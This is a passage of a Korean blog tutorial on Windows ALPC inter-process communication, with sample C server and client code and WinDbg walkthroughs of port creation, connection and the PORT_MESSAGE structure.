&#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p> &#x2192; &#xC774;&#xAC83;&#xC774; <strong>ALPC Connection Port!</strong></p></li><li><p>&#xC11C;&#xBC84;&#xB294; <code>NtAlpcSendWaitRecievePort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC5F0;&#xACB0;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;.</p></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; <code>NtAlpcConnectPort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xC5F0;&#xACB0;&#xD560; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8; &#xC774;&#xB984; : &#x201C;\RPC Control\HackyBoiz&#x201D;</li><li>(&#xC120;&#xD0DD;) &#xC11C;&#xBC84;&#xC5D0;&#xAC8C; &#xBCF4;&#xB0BC; &#xCD08;&#xAE30; &#xBA54;&#xC2DC;&#xC9C0;</li><li>(&#xC120;&#xD0DD;) &#xC11C;&#xBC84; SID &#xC9C0;&#xC815;&#xD558;&#xC5EC; &#xC62C;&#xBC14;&#xB978; &#xC11C;&#xBC84;&#xC778;&#xC9C0; &#xAC80;&#xC99D;</li><li>(&#xC120;&#xD0DD;) &#xBA54;&#xC2DC;&#xC9C0; &#xC18D;&#xC131;(Attribute) &#xCD94;&#xAC00;</li></ul></li><li>&#xC774; &#xC694;&#xCCAD;&#xC740; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xBA70;, &#xC11C;&#xBC84;&#xB294; <code>NtAlpcAcceptConnectPort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC5F0;&#xACB0;&#xC744; &#xC2B9;&#xC778;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xC808;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xAC00; boolean &#xC73C;&#xB85C; true&#xBA74; &#xC218;&#xB77D;, false&#xBA74; &#xAC70;&#xC808;&#xC744; &#xB73B;&#xD568;</li></ul></li><li>&#xC5F0;&#xACB0;&#xC744; &#xC218;&#xB77D; &#xC2DC;, &#xCEE4;&#xB110;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; ALPC Communication Port&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC640; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC591;&#xCABD;&#xC5D0; &#xAC01;&#xAC01; &#xD578;&#xB4E4;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; Connection Port&#xAC00; &#xC544;&#xB2CC;, &#xC774; Communication Port&#xB97C; &#xD1B5;&#xD574; &#xC1A1;&#xC218;&#xC2E0; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xC81C;&#xB294; &#xC870;&#xAE08; &#xC774;&#xD574;&#xAC00; &#xB418;&#xB294;&#xAD70;&#xC694;!! &#xC88B;&#xC544;&#xC694; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xC81C; &#xC2E4;&#xC2B5;&#xC744; &#xD1B5;&#xD574; &#xC9C1;&#xC811; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><a href="https://github.com/DownWithUp/ALPC-Example">https://github.com/DownWithUp/ALPC-Example</a></p><p>&#xC704; github&#xC5D0;&#xC11C; &#xC608;&#xC81C; ALPC &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC9C1;&#xC811; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!XD</p><blockquote><p>Server.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_MSG_LEN 0x500</span><span class="hljs-function">LPVOID <span class="hljs-title">AllocMsgMem</span><span class="hljs-params">(SIZE_T Size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE)));}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CreatePortAndListen</span><span class="hljs-params">(LPCWSTR PortName)</span></span><span class="hljs-function"></span>{    ALPC_PORT_ATTRIBUTES    serverPortAttr;    OBJECT_ATTRIBUTES       objPort;    UNICODE_STRING          usPortName;    PORT_MESSAGE            pmRequest;    PORT_MESSAGE            pmReceive;    NTSTATUS                ntRet;    BOOLEAN                 bBreak;    HANDLE                  hConnectedPort;    HANDLE                  hPort;    SIZE_T                  nLen;    LPVOID                  lpMem;    BYTE                    bTemp;      RtlInitUnicodeString(&amp;usPortName, PortName);    InitializeObjectAttributes(&amp;objPort, &amp;usPortName, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    RtlSecureZeroMemory(&amp;serverPortAttr, <span class="hljs-keyword">sizeof</span>(serverPortAttr));    serverPortAttr.MaxMessageLength = MAX_MSG_LEN;    ntRet = NtAlpcCreatePort(&amp;hPort, &amp;objPort, &amp;serverPortAttr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcCreatePort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        nLen = <span class="hljs-keyword">sizeof</span>(pmReceive);        ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmReceive, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        <span class="hljs-keyword">if</span> (!ntRet)        {            RtlSecureZeroMemory(&amp;pmRequest, <span class="hljs-keyword">sizeof</span>(pmRequest));            pmRequest.MessageId = pmReceive.MessageId;            pmRequest.u1.s1.DataLength = <span class="hljs-number">0x0</span>;            pmRequest.u1.s1.TotalLength = pmRequest.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            ntRet = NtAlpcAcceptConnectPort(&amp;hConnectedPort, hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmRequest, <span class="hljs-literal">NULL</span>, TRUE); <span class="hljs-comment">// 0</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcAcceptConnectPort: 0x%X\n&quot;</span>, ntRet);            <span class="hljs-keyword">if</span> (!ntRet)            {                bBreak = TRUE;                <span class="hljs-keyword">while</span> (bBreak)                {                    nLen = MAX_MSG_LEN;                    lpMem = AllocMsgMem(nLen);                    NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (PPORT_MESSAGE)lpMem, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);                    pmReceive = *(PORT_MESSAGE*)lpMem;                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), <span class="hljs-string">&quot;exit\n&quot;</span>))                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received &apos;exit&apos; command\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                        ntRet = NtAlpcDisconnectPort(hPort, <span class="hljs-number">0</span>);                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcDisconnectPort: %X\n&quot;</span>, ntRet);                        CloseHandle(hConnectedPort);                        CloseHandle(hPort);                        ExitThread(<span class="hljs-number">0</span>);                    }                    <span class="hljs-keyword">else</span>                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received Data: &quot;</span>);                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= pmReceive.u1.s1.DataLength; i++)                        {                            bTemp = *(BYTE*)((BYTE*)lpMem + i + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%X &quot;</span>, bTemp);                        }                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                    }                }            }        }    }    ExitThread(<span class="hljs-number">0</span>);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    HANDLE hThread;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] ALPC-Example Server\n&quot;</span>);    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)&amp;CreatePortAndListen, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    WaitForSingleObject(hThread, INFINITE);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Shuting down server\n&quot;</span>);    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><blockquote><p>Client.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span>{    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    UNICODE_STRING  usPort;    PORT_MESSAGE    pmSend;    PORT_MESSAGE    pmReceive;    NTSTATUS        ntRet;    BOOLEAN         bBreak;    SIZE_T          nLen;    HANDLE          hPort;    LPVOID          lpMem;     CHAR            szInput[MSG_LEN];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ALPC-Example Client\n&quot;</span>);    RtlInitUnicodeString(&amp;usPort, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>);    RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));    pmSend.u1.s1.DataLength = MSG_LEN;    pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(pmSend);    lpMem = CreateMsgMem(&amp;pmSend, MSG_LEN, <span class="hljs-string">L&quot;Hello HackyBoiz!&quot;</span>);    ntRet = NtAlpcConnectPort(&amp;hPort, &amp;usPort, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcConnectPort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] type &apos;exit&apos; to disconnect from the server\n&quot;</span>);        bBreak = TRUE;        <span class="hljs-keyword">while</span> (bBreak)        {            RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));            RtlSecureZeroMemory(&amp;szInput, <span class="hljs-keyword">sizeof</span>(szInput));            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);            fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);            pmSend.u1.s1.DataLength = <span class="hljs-built_in">strlen</span>(szInput);            pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);            ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, (PPORT_MESSAGE)lpMem, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcSendWaitReceivePort: 0x%X\n&quot;</span>, ntRet);            HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);        }    }    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><p>&#xC77C;&#xB2E8; Server.c &#xCF54;&#xB4DC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; \RPC Control &#xC704;&#xCE58;&#xC5D0; Server ALPC Port&#xAC00; &#xC0DD;&#xAE34; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;!</p><p><img src="image%206.png" alt="image.png"></p><p>Windbg&#xB85C; Server &#xBD80;&#xBD84;&#xC744; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; NtAlpcCreatePort &#xD568;&#xC218;&#xB97C; &#xBCFC;&#xAE4C;&#xC694;!</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p><img src="image%207.png" alt="image.png"></p><p>bp&#xB97C; &#xAC74; &#xB4A4;, rdx &#xBD80;&#xBD84;&#xC774; ObjectAttributes &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; Attributes&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xC870;&#xAE08; &#xC774;&#xB530;&#xAC00; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACE0;, &#xC774; &#xC548;&#xC5D0; ObjectName&#xC774; &#xC874;&#xC7AC;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. POBJECT_ATTRIBUTES &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> {</span>    ULONG           Length;    HANDLE          RootDirectory;    PUNICODE_STRING ObjectName;   <span class="hljs-comment">// &#x2190; &#xC774;&#xAC70;</span>    ULONG           Attributes;    PVOID           SecurityDescriptor;    PVOID           SecurityQualityOfService;} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</code></pre><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; rdx + 0x10 &#xBD80;&#xBD84;&#xC774; ObjectName &#xC774;&#xACA0;&#xC8E0;? &#xC774;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;</p><p><img src="image%208.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; \RPC Control\HackyBoiz &#xC774;&#xB984;&#xC73C;&#xB85C; Port&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xC81C; Windbg&#xB85C; Client &#xBD80;&#xBD84;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xC5EC; &#xD1B5;&#xC2E0;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><p>&#xC77C;&#xB2E8; Client&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; Server&#xC5D0;&#xC11C; Accept&#xB97C; &#xD574;&#xC900; &#xB4A4;, Client&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC880; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xC77C;&#xB2E8; &#xCC98;&#xC74C;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC778; NtAlpcConnectPort&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; </p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName, <span class="hljs-comment">// &lt;- &#xC774;&#xACF3;</span></span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>rdx&#xC5D0; PortName&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC8E0;, &#xC774;&#xB97C; &#xCD9C;&#xB825;&#xD574;&#xBCF4;&#xBA74; &#xC81C;&#xAC00; Server&#xB85C; &#xC62C;&#xB824;&#xB193;&#xC740; HakcyBoiz port&#xAC00; &#xB728;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xB807;&#xAC8C; Connect &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; Server&#xC5D0;&#xC11C; Accept &#xD560;&#xC9C0; &#xB9D0;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xAC8C; &#xB418;&#xACA0;&#xC8E0;?</p><p>&#xC77C;&#xB2E8; Server.c &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xC758; AlpcAcceptConnectPort &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74;</p><pre><code class="hljs cpp">ntRet = NtAlpcAcceptConnectPort(    &amp;hConnectedPort,   <span class="hljs-comment">// OUT PHANDLE PortHandle  &#x2192; rcx</span>    hPort,     <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       &amp;pmRequest,         <span class="hljs-literal">NULL</span>,               TRUE              );</code></pre><p>&#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xC778;&#xC790;&#xAC00; &#xC138;&#xD305;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>rcx&#xC758; &#xACBD;&#xC6B0; &#xC11C;&#xBC84;&#xAC00; &#xC0C8;&#xB85C; &#xCC44;&#xC6CC;&#xC904; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8; &#xD578;&#xB4E4;&#xC774;&#xBBC0;&#xB85C; syscall&#xC774; &#xC9C4;&#xD589;&#xB41C; &#xC774;&#xD6C4;&#xC5D0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; hConnectedPort&#xC5D0; &#xC2E4;&#xC81C; ALPC &#xC11C;&#xBC84; communication port &#xD578;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xD6C4;&#xC5D0; &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xC778; AcceptConnection &#xBD80;&#xBD84;&#xC774; TRUE&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; Accpet &#xB418;&#xC5B4; &#xC11C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xB418;&#xC5B4; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="3-ALPC-Messaging"><a href="#3-ALPC-Messaging" class="headerlink" title="3. ALPC Messaging"></a>3. ALPC Messaging</h2><p>&#xC774;&#xC81C; ALPC&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xD1B5;&#xC2E0;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8;, &#xC2E4;&#xC81C;&#xB85C; &#xC654;&#xB2E4; &#xAC14;&#xB2E4; &#xD558;&#xB294; &#xBA54;&#xC2DC;&#xC9C0; &#xD3EC;&#xB9F7;&#xC744; &#xAE4C;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;.</p><p>ALPC&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xD56D;&#xC0C1; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xB97C; &#xAC00;&#xC9C0;&#xB294;&#xB370;&#xC694;!</p><p><img src="image%2011.png" alt="image.png"></p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload(Data) ]</code></pre><p>&#xC55E;&#xBD80;&#xBD84;&#xC740; &#xACE0;&#xC815;&#xB41C; &#xD5E4;&#xB354; PORT_MESSAGE, &#xADF8; &#xB4A4;&#xB294; &#xC800;&#xD76C;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xBCF4;&#xB0B4;&#xACE0; &#xC2F6;&#xC740; text/binary &#xB370;&#xC774;&#xD130; &#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-PORT-MESSAGE-&#xAD6C;&#xC870;"><a href="#3-1-PORT-MESSAGE-&#xAD6C;&#xC870;" class="headerlink" title="3.1. PORT_MESSAGE &#xAD6C;&#xC870;"></a>3.1. PORT_MESSAGE &#xAD6C;&#xC870;</h3><p>&#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PORT_MESSAGE</span></span><span class="hljs-class">{</span>    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT DataLength;   <span class="hljs-comment">// &#xC2E4;&#xC81C; Payload &#xAE38;&#xC774;</span>            USHORT TotalLength;  <span class="hljs-comment">// PORT_MESSAGE + Payload &#xC804;&#xCCB4; &#xD06C;&#xAE30;</span>        } s1;        ULONG Length;    } u1;    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT Type;             <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xD0C0;&#xC785;</span>            USHORT DataInfoOffset;   <span class="hljs-comment">// Attribute &#xC601;&#xC5ED; &#xC624;&#xD504;&#xC14B;</span>        } s2;        ULONG ZeroInit;    } u2;    <span class="hljs-keyword">union</span> {        CLIENT_ID ClientId;          <span class="hljs-comment">// &#xC1A1;&#xC2E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC2A4;&#xB808;&#xB4DC; ID</span>        <span class="hljs-keyword">double</span>    DoNotUseThisField; <span class="hljs-comment">// (&#xC815;&#xB82C;&#xC6A9;)</span>    };    ULONG MessageId;                 <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xC2DD;&#xBCC4;&#xC790;</span>    <span class="hljs-keyword">union</span> {        SIZE_T ClientViewSize;       <span class="hljs-comment">// &#xC139;&#xC158; &#xBDF0; &#xD06C;&#xAE30;</span>        ULONG  CallbackId;           <span class="hljs-comment">// &#xCF5C;&#xBC31; ID</span>    };} PORT_MESSAGE, *PPORT_MESSAGE;</code></pre><p>&#xC2E4;&#xC81C;&#xB85C; &#xC6B0;&#xB9AC;&#xAC00; &#xC790;&#xC8FC; &#xB9CC;&#xC9C0;&#xB294; &#xD544;&#xB4DC;&#xB294; &#xAC70;&#xC758; &#xB124; &#xAC1C; &#xC815;&#xB3C4;&#xB77C;&#xACE0; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><p>u1.s1.DataLength</p><p>  &#x2192; payload &#xAE38;&#xC774;</p></li><li><p>u1.s1.TotalLength</p><p>  &#x2192; sizeof(PORT_MESSAGE) + DataLength</p><p>  &#x2192; &#xCEE4;&#xB110;&#xC774; &#x201C;&#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#x201D;&#xB97C; &#xC54C;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;</p></li><li><p>ClientId</p><p>  &#x2192; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC2A4;&#xB808;&#xB4DC;&#xC758; ID</p></li><li><p>MessageId / CallbackId</p><p>  &#x2192; &#xC694;&#xCCAD;/&#xC751;&#xB2F5; &#xB9E4;&#xCE6D;&#xD560; &#xB54C; &#xC4F0;&#xB294; ID</p></li></ul><p>&#xC989;, &#xD3EC;&#xB9F7; &#xC790;&#xCCB4;&#xB294; &#xB418;&#xAC8C; &#xC2EC;&#xD50C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xC0AC;&#xC6A9;&#xD55C; &#xC608;&#xC81C; Client &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xBA74;:</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span 